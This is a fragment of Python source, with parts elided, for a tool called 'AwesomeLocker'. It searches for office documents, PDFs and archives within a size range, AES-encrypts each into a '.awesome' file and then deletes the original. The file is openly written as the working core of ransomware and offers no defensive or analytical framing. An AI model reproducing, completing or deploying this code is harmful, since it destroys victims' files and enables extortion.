...
MATCH_FILE_TYPE = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.vsdx', '.rar', '.zip', '.pdf', ]
                    ...
                    try:
                        ...
                        if self.match_min_size < os.path.getsize(absolute_path) < self.match_max_size:
                            ...
                            if file_type.lower() in MATCH_FILE_TYPE:
                                ...
                                # open(r'C:\Users\xyz\Desktop\match.txt', 'a').write(absolute_path + '\n')
    ...
    def encrypt(self, in_file, out_file, key_length=32):
        ...
        while not finished:
            ...
            if len(chunk) == 0 or len(chunk) % bs != 0:
                padding_length = (bs - len(chunk) % bs) or bs  # 如果不是16的整数倍需要手动填充
...
if __name__ == "__main__":
    ...
    if aes_key:
        locker = AwesomeLocker(aes_key)

    if files and locker:
        print("Done...")
        for file in files:
            with open(file, 'rb') as in_file, open(file + ".awesome", 'wb') as out_file:
                locker.encrypt(in_file, out_file)
                print(file + " Encrypted")
            try:
                os.remove(file)     # when the file encrypted then delete file
            except Exception as err:
                print(err)
